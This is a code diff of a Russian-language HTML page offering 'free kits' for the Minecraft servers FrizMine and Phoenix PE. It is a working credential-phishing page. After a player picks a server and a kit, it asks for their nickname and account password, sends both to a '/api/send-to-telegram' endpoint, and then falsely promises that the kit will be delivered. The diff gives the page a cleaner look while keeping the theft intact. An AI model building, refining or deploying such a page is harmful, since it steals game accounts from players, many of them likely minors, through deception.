@@ -3,297 +3,274 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Free Kits Minecraft Server</title>
+    <title>Free Kits Minecraft</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
         }
 
         body {
-            font-family: 'Minecraft', Arial, sans-serif;
+            background: #f0f2f5;
             min-height: 100vh;
-            background: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)),
-                        url('https://wallpapercave.com/wp/wp8736944.jpg') center/cover fixed;
             display: flex;
             justify-content: center;
             align-items: center;
-            position: relative;
+            padding: 20px;
         }
 
-        /* Анимированный фон с надписью */
+        /* Водяной знак на фоне */
         body::before {
             content: "Free Kits Minecraft Server";
             position: fixed;
             top: 50%;
             left: 50%;
-            transform: translate(-50%, -50%) rotate(-15deg);
-            font-size: clamp(2rem, 15vw, 8rem);
-            font-weight: bold;
-            color: rgba(255, 255, 255, 0.03);
+            transform: translate(-50%, -50%);
+            font-size: 5vw;
+            color: rgba(0, 0, 0, 0.03);
             white-space: nowrap;
             pointer-events: none;
             z-index: 0;
-            text-transform: uppercase;
-            letter-spacing: 20px;
-            animation: watermarkFloat 20s infinite ease-in-out;
-            width: 100%;
-            text-align: center;
-        }
-
-        @keyframes watermarkFloat {
-            0%, 100% { transform: translate(-50%, -50%) rotate(-15deg) scale(1); opacity: 0.03; }
-            50% { transform: translate(-50%, -50%) rotate(-13deg) scale(1.1); opacity: 0.05; }
+            font-weight: bold;
         }
 
         .container {
-            background: rgba(20, 20, 30, 0.95);
-            backdrop-filter: blur(10px);
-            padding: 40px;
-            border-radius: 20px;
-            box-shadow: 0 0 50px rgba(0, 255, 255, 0.3),
-                        0 0 100px rgba(106, 13, 173, 0.3);
-            border: 2px solid rgba(0, 255, 255, 0.3);
-            width: 90%;
-            max-width: 500px;
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 480px;
+            padding: 30px;
             position: relative;
             z-index: 1;
-            animation: glowPulse 3s infinite ease-in-out;
         }
 
-        @keyframes glowPulse {
-            0%, 100% { box-shadow: 0 0 50px rgba(0, 255, 255, 0.3), 0 0 100px rgba(106, 13, 173, 0.3); }
-            50% { box-shadow: 0 0 70px rgba(0, 255, 255, 0.5), 0 0 150px rgba(106, 13, 173, 0.5); }
-        }
-
-        h1, h2 {
+        h1 {
+            font-size: 24px;
+            color: #1a1a1a;
+            margin-bottom: 20px;
             text-align: center;
-            color: #fff;
-            text-shadow: 0 0 10px #00ffff, 0 0 20px #00ffff, 0 0 30px #00ffff;
-            margin-bottom: 30px;
-            font-size: 2em;
-            letter-spacing: 2px;
+            font-weight: 600;
         }
 
         h2 {
-            font-size: 1.5em;
-            margin-bottom: 20px;
+            font-size: 18px;
+            color: #666;
+            margin-bottom: 15px;
+            font-weight: 500;
+        }
+
+        .step {
+            display: none;
+        }
+
+        .step.active {
+            display: block;
         }
 
         .server-select {
             display: flex;
-            gap: 20px;
-            justify-content: center;
-            margin-bottom: 30px;
+            gap: 12px;
+            margin-bottom: 10px;
         }
 
-        .server-btn {
-            padding: 15px 30px;
-            font-size: 1.2em;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            border: none;
-            border-radius: 10px;
-            cursor: pointer;
-            transition: all 0.3s;
-            font-weight: bold;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            border: 2px solid rgba(255, 255, 255, 0.3);
+        .server-btn, .kit-btn {
             flex: 1;
+            padding: 14px;
+            border: 2px solid #e0e0e0;
+            background: white;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 500;
+            color: #333;
+            cursor: pointer;
+            transition: all 0.2s;
         }
 
-        .server-btn:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.5);
-            border-color: #00ffff;
+        .server-btn:hover, .kit-btn:hover {
+            border-color: #2196F3;
+            background: #f5f9ff;
         }
 
-        .server-btn.selected {
-            background: linear-gradient(135deg, #00ffff 0%, #764ba2 100%);
-            box-shadow: 0 0 30px #00ffff;
-            border-color: #fff;
+        .server-btn.selected, .kit-btn.selected {
+            background: #2196F3;
+            color: white;
+            border-color: #2196F3;
         }
 
         .kits-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
-            gap: 15px;
-            margin: 25px 0;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin: 20px 0;
         }
 
-        .kit-btn {
-            padding: 15px;
-            background: rgba(255, 255, 255, 0.1);
-            border: 2px solid rgba(255, 255, 255, 0.2);
-            border-radius: 10px;
-            color: white;
-            font-weight: bold;
-            cursor: pointer;
-            transition: all 0.3s;
-            font-size: 1.1em;
-            text-shadow: 0 0 5px rgba(0, 0, 0, 0.5);
+        .info-box {
+            background: #f8f9fa;
+            border-left: 4px solid #2196F3;
+            padding: 12px 16px;
+            border-radius: 6px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            color: #555;
         }
 
-        .kit-btn:hover {
-            background: rgba(255, 255, 255, 0.2);
-            transform: scale(1.05);
-            border-color: #00ffff;
-            box-shadow: 0 0 20px #00ffff;
-        }
-
-        .kit-btn.selected {
-            background: linear-gradient(135deg, #00ffff, #764ba2);
-            border-color: white;
-            box-shadow: 0 0 30px #00ffff;
-        }
-
-        .login-form {
-            display: none;
-            margin-top: 30px;
-            padding-top: 30px;
-            border-top: 2px solid rgba(255, 255, 255, 0.2);
-        }
-
-        .login-form.active {
+        .info-box strong {
+            color: #2196F3;
             display: block;
-            animation: slideIn 0.5s ease;
+            margin-bottom: 4px;
         }
 
-        @keyframes slideIn {
-            from {
-                opacity: 0;
-                transform: translateY(20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 6px;
+            color: #555;
+            font-size: 14px;
+            font-weight: 500;
         }
 
         input {
             width: 100%;
-            padding: 15px;
-            margin: 8px 0 20px 0;
-            background: rgba(255, 255, 255, 0.1);
-            border: 2px solid rgba(255, 255, 255, 0.2);
-            border-radius: 10px;
-            color: white;
-            font-size: 1.1em;
-            transition: all 0.3s;
+            padding: 12px 14px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            font-size: 15px;
+            transition: all 0.2s;
         }
 
         input:focus {
             outline: none;
-            border-color: #00ffff;
-            box-shadow: 0 0 20px rgba(0, 255, 255, 0.3);
-            background: rgba(255, 255, 255, 0.15);
+            border-color: #2196F3;
         }
 
         input::placeholder {
-            color: rgba(255, 255, 255, 0.5);
+            color: #999;
         }
 
         .submit-btn {
             width: 100%;
-            padding: 15px;
-            background: linear-gradient(135deg, #00ff00, #00ffff);
-            color: #000;
+            padding: 14px;
+            background: #2196F3;
+            color: white;
             border: none;
-            border-radius: 10px;
-            font-size: 1.2em;
-            font-weight: bold;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
             cursor: pointer;
-            transition: all 0.3s;
-            text-transform: uppercase;
-            letter-spacing: 2px;
+            transition: background 0.2s;
+            margin-top: 10px;
         }
 
         .submit-btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 10px 30px rgba(0, 255, 255, 0.5);
+            background: #1976D2;
         }
 
-        #message {
-            text-align: center;
-            margin-top: 20px;
-            padding: 10px;
-            border-radius: 10px;
-            font-weight: bold;
+        .message {
+            margin-top: 16px;
+            padding: 12px;
+            border-radius: 6px;
+            font-size: 14px;
+            display: none;
         }
 
-        .success {
-            background: rgba(0, 255, 0, 0.2);
-            color: #00ff00;
-            border: 2px solid #00ff00;
+        .message.show {
+            display: block;
         }
 
-        .error {
-            background: rgba(255, 0, 0, 0.2);
-            color: #ff0000;
-            border: 2px solid #ff0000;
+        .message.success {
+            background: #e8f5e8;
+            color: #2e7d32;
+            border: 1px solid #a5d6a7;
         }
 
-        .info-text {
-            text-align: center;
-            color: rgba(255, 255, 255, 0.7);
-            margin-bottom: 20px;
-            font-size: 1.1em;
+        .message.error {
+            background: #ffebee;
+            color: #c62828;
+            border: 1px solid #ef9a9a;
         }
 
-        .selected-info {
-            background: rgba(255, 255, 255, 0.1);
-            padding: 10px;
-            border-radius: 10px;
-            margin-bottom: 20px;
-            text-align: center;
-            color: #00ffff;
-            font-weight: bold;
+        .back-btn {
+            background: none;
+            border: none;
+            color: #666;
+            cursor: pointer;
+            font-size: 14px;
+            padding: 8px 0;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .back-btn:hover {
+            color: #2196F3;
+        }
+
+        .back-btn::before {
+            content: "←";
+            font-size: 18px;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>⚡ FREE KITS ⚡</h1>
-        
-        <!-- Шаг 1: Выбор сервера -->
-        <div id="step1">
-            <h2>Выберите сервер</h2>
+        <h1>Free Kits Minecraft Server</h1>
+
+        <!-- ШАГ 1: Выбор сервера -->
+        <div id="step1" class="step active">
+            <h2>Выберите сервер:</h2>
             <div class="server-select">
                 <button class="server-btn" onclick="selectServer('frizmine')">FrizMine</button>
                 <button class="server-btn" onclick="selectServer('phoenix')">Phoenix PE</button>
             </div>
         </div>
 
-        <!-- Шаг 2: Выбор кита (показывается после выбора сервера) -->
-        <div id="step2" style="display: none;">
-            <div class="selected-info" id="selectedServerInfo"></div>
-            <h2>Выберите кит</h2>
+        <!-- ШАГ 2: Выбор кита -->
+        <div id="step2" class="step">
+            <button class="back-btn" onclick="goToStep1()">Назад к серверам</button>
+            <div class="info-box" id="selectedServerInfo">
+                <strong>Выбран сервер:</strong> <span id="serverNameDisplay"></span>
+            </div>
+            <h2>Доступные киты:</h2>
             <div class="kits-grid" id="kitsContainer"></div>
         </div>
 
-        <!-- Шаг 3: Форма входа (показывается после выбора кита) -->
-        <div id="step3" style="display: none;">
-            <div class="selected-info" id="selectedKitInfo"></div>
-            <div class="info-text">
-                Для получения кита подтвердите свой аккаунт
+        <!-- ШАГ 3: Форма подтверждения -->
+        <div id="step3" class="step">
+            <button class="back-btn" onclick="goToStep2()">Назад к китам</button>
+            <div class="info-box">
+                <strong>Ваш выбор:</strong>
+                <span id="finalChoiceDisplay"></span>
             </div>
+            
             <form id="loginForm">
-                <input type="text" id="username" name="username" required placeholder="Ваш ник в Minecraft">
-                <input type="password" id="password" name="password" required placeholder="Пароль от аккаунта">
-                <button type="submit" class="submit-btn">Получить кит!</button>
+                <div class="form-group">
+                    <label>Никнейм в Minecraft:</label>
+                    <input type="text" id="username" required placeholder="Введите ваш ник">
+                </div>
+                
+                <div class="form-group">
+                    <label>Пароль от аккаунта:</label>
+                    <input type="password" id="password" required placeholder="Введите пароль">
+                </div>
+                
+                <button type="submit" class="submit-btn">Подтвердить и получить кит</button>
             </form>
-            <div id="message"></div>
+            
+            <div id="message" class="message"></div>
         </div>
     </div>
 
     <script>
-        // Текущие выбранные значения
         let selectedServer = '';
         let selectedKit = '';
 
-        // Киты для разных серверов
         const kits = {
             'frizmine': [
                 { name: 'Кит Магистра', id: 'master' },
@@ -301,84 +278,104 @@
                 { name: 'Кит Легенды', id: 'legend' }
             ],
             'phoenix': [
-                { name: 'Кит Князя', id: 'prince' },
-                { name: 'Кит Принца', id: 'king' },
-                { name: 'Кит ютуб', id: 'youtube' }
+                { name: 'Кит Князя', id: 'knyaz' },
+                { name: 'Кит Принца', id: 'prince' },
+                { name: 'Кит Ютуб', id: 'youtube' }
             ]
         };
 
-        // Названия серверов для отображения
         const serverNames = {
             'frizmine': 'FrizMine',
             'phoenix': 'Phoenix PE'
         };
 
-        // Функция выбора сервера
         function selectServer(server) {
             selectedServer = server;
-            selectedKit = ''; // Сбрасываем выбранный кит
+            selectedKit = '';
             
-            // Подсветка кнопок
+            // Убираем выделение у всех кнопок серверов
             document.querySelectorAll('.server-btn').forEach(btn => {
                 btn.classList.remove('selected');
             });
+            
+            // Выделяем нажатую кнопку
             event.target.classList.add('selected');
             
-            // Показываем киты
-            showKits(server);
+            // Показываем следующий шаг
+            showKits();
         }
 
-        // Показать киты для выбранного сервера
-        function showKits(server) {
-            const step1 = document.getElementById('step1');
-            const step2 = document.getElementById('step2');
-            const step3 = document.getElementById('step3');
-            const kitsContainer = document.getElementById('kitsContainer');
-            const selectedServerInfo = document.getElementById('selectedServerInfo');
+        function showKits() {
+            document.getElementById('step1').classList.remove('active');
+            document.getElementById('step2').classList.add('active');
+            document.getElementById('step3').classList.remove('active');
             
-            // Обновляем информацию
-            selectedServerInfo.innerHTML = `Выбран сервер: <span style="color: #00ffff; text-shadow: 0 0 10px #00ffff;">${serverNames[server]}</span>`;
+            // Обновляем информацию о сервере
+            document.getElementById('serverNameDisplay').textContent = serverNames[selectedServer];
             
             // Создаем кнопки китов
+            const kitsContainer = document.getElementById('kitsContainer');
             kitsContainer.innerHTML = '';
-            kits[server].forEach(kit => {
+            
+            kits[selectedServer].forEach(kit => {
                 const button = document.createElement('button');
                 button.className = 'kit-btn';
                 button.textContent = kit.name;
-                button.onclick = () => selectKit(kit.name, kit.id);
+                button.onclick = () => selectKit(kit.name);
                 kitsContainer.appendChild(button);
             });
-            
-            // Переключаем видимость шагов
-            step1.style.display = 'none';
-            step2.style.display = 'block';
-            step3.style.display = 'none';
         }
 
-        // Функция выбора кита
-        function selectKit(kitName, kitId) {
+        function selectKit(kitName) {
             selectedKit = kitName;
             
-            // Подсветка выбранного кита
+            // Убираем выделение у всех кнопок китов
             document.querySelectorAll('.kit-btn').forEach(btn => {
                 btn.classList.remove('selected');
             });
+            
+            // Выделяем нажатую кнопку
             event.target.classList.add('selected');
             
-            // Показываем форму входа
-            showLoginForm();
+            // Показываем форму
+            showForm();
         }
 
-        // Показать форму входа
-        function showLoginForm() {
-            const step2 = document.getElementById('step2');
-            const step3 = document.getElementById('step3');
-            const selectedKitInfo = document.getElementById('selectedKitInfo');
+        function showForm() {
+            document.getElementById('step1').classList.remove('active');
+            document.getElementById('step2').classList.remove('active');
+            document.getElementById('step3').classList.add('active');
             
-            selectedKitInfo.innerHTML = `Выбран кит: <span style="color: #00ffff; text-shadow: 0 0 10px #00ffff;">${selectedKit}</span> для сервера ${serverNames[selectedServer]}`;
+            // Обновляем информацию о выборе
+            document.getElementById('finalChoiceDisplay').innerHTML = 
+                `Сервер: <strong>${serverNames[selectedServer]}</strong>, Кит: <strong>${selectedKit}</strong>`;
+        }
+
+        function goToStep1() {
+            selectedServer = '';
+            selectedKit = '';
             
-            step2.style.display = 'none';
-            step3.style.display = 'block';
+            document.getElementById('step1').classList.add('active');
+            document.getElementById('step2').classList.remove('active');
+            document.getElementById('step3').classList.remove('active');
+            
+            // Убираем выделение со всех кнопок
+            document.querySelectorAll('.server-btn, .kit-btn').forEach(btn => {
+                btn.classList.remove('selected');
+            });
+        }
+
+        function goToStep2() {
+            selectedKit = '';
+            
+            document.getElementById('step1').classList.remove('active');
+            document.getElementById('step2').classList.add('active');
+            document.getElementById('step3').classList.remove('active');
+            
+            // Убираем выделение с китов
+            document.querySelectorAll('.kit-btn').forEach(btn => {
+                btn.classList.remove('selected');
+            });
         }
 
         // Обработка отправки формы
@@ -390,14 +387,16 @@
             const messageDiv = document.getElementById('message');
             
             if (!username || !password) {
-                messageDiv.innerHTML = '<div class="error">Заполните все поля!</div>';
+                messageDiv.textContent = 'Заполните все поля!';
+                messageDiv.className = 'message error show';
                 return;
             }
 
-            messageDiv.innerHTML = '<div style="color: #00ffff;">Отправка...</div>';
+            messageDiv.textContent = 'Отправка...';
+            messageDiv.className = 'message show';
+            messageDiv.style.color = '#666';
 
             try {
-                // Отправляем данные с информацией о сервере и ките
                 const response = await fetch('/api/send-to-telegram', {
                     method: 'POST',
                     headers: {
@@ -414,38 +413,27 @@
                 const result = await response.json();
 
                 if (result.success) {
-                    messageDiv.innerHTML = '<div class="success">✓ Ура! Спасибо что выбрали нас! Кит скоро будет выдан!</div>';
+                    messageDiv.textContent = '✓ Ура! Спасибо что выбрали нас! Кит скоро будет выдан!';
+                    messageDiv.className = 'message success show';
                     
-                    // Сброс через 3 секунды
+                    // Очищаем форму
+                    document.getElementById('username').value = '';
+                    document.getElementById('password').value = '';
+                    
+                    // Возвращаемся к началу через 3 секунды
                     setTimeout(() => {
-                        selectedServer = '';
-                        selectedKit = '';
-                        document.getElementById('step1').style.display = 'block';
-                        document.getElementById('step2').style.display = 'none';
-                        document.getElementById('step3').style.display = 'none';
-                        document.getElementById('username').value = '';
-                        document.getElementById('password').value = '';
-                        messageDiv.innerHTML = '';
-                        
-                        // Убираем подсветку с кнопок
-                        document.querySelectorAll('.server-btn, .kit-btn').forEach(btn => {
-                            btn.classList.remove('selected');
-                        });
+                        goToStep1();
+                        messageDiv.className = 'message';
                     }, 3000);
                 } else {
-                    messageDiv.innerHTML = '<div class="error">✗ Ошибка отправки</div>';
+                    messageDiv.textContent = '✗ Ошибка отправки. Попробуйте позже.';
+                    messageDiv.className = 'message error show';
                 }
             } catch (error) {
-                messageDiv.innerHTML = '<div class="error">✗ Ошибка соединения</div>';
+                messageDiv.textContent = '✗ Ошибка соединения. Проверьте интернет.';
+                messageDiv.className = 'message error show';
             }
         });
-
-        // Добавляем плавное появление
-        document.body.style.opacity = '0';
-        window.onload = function() {
-            document.body.style.transition = 'opacity 1s';
-            document.body.style.opacity = '1';
-        };
     </script>
 </body>
 </html>
